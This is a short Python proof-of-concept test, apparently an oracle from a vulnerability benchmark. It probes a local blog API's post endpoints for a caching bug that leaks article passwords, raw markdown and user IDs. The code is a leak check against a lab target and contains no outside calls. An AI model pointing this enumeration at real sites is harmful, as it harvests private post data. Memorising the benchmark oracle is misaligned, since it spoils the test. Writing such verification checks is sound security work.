"""PoC: Structural debt — cache format lock-in leaks Password and Original fields.

After the 3-stage chain, prepareForCache() returns the raw ZPosts entity
instead of a selective map. The cached API response includes Password
(article password) and Original (raw markdown) fields.
"""

from mosaic.oracle.exploit import ExploitTest


class CacheLockinExploit(ExploitTest):
    """Cache format lock-in leaks internal post fields."""

    def __init__(self, base_url: str = "http://localhost:39081"):
        super().__init__(base_url)

    @property
    def chain_id(self) -> str:
        return "gin_cache_lockin"

    def setup(self) -> None:
        """No setup needed — public API, no auth required."""
        pass

    def execute(self) -> tuple[bool, str]:
        """Check if the API exposes internal post fields."""
        # Try to get any post via the API
        for post_id in range(1, 10):
            resp = self.http_get(f"/api/v1/posts/{post_id}")
            if resp.ok:
                data = resp.json()
                evidence = []
                vuln = False

                # Check for Password field (article password)
                if "Password" in data or "password" in data:
                    pw = data.get("Password") or data.get("password")
                    evidence.append(f"'Password' field in response: '{str(pw)[:30]}'")
                    vuln = True

                # Check for Original field (raw markdown)
                if "Original" in data or "original" in data:
                    orig = data.get("Original") or data.get("original")
                    if orig:
                        evidence.append(f"'Original' (raw markdown) in response: '{str(orig)[:50]}...'")
                        vuln = True

                # Check for UserId (internal)
                if "UserId" in data or "user_id" in data:
                    evidence.append("'UserId' internal field exposed")
                    vuln = True

                # Check for more fields than the DTO should have
                if len(data) > 6:
                    evidence.append(f"Response has {len(data)} fields (expected 5 from DTO)")

                if vuln:
                    return True, f"Cache lock-in leak at /api/v1/posts/{post_id}. " + " ".join(evidence)

                return False, f"Post {post_id} has only public fields. Keys: {sorted(data.keys())}"

        return False, "No posts found at /api/v1/posts/1-9"
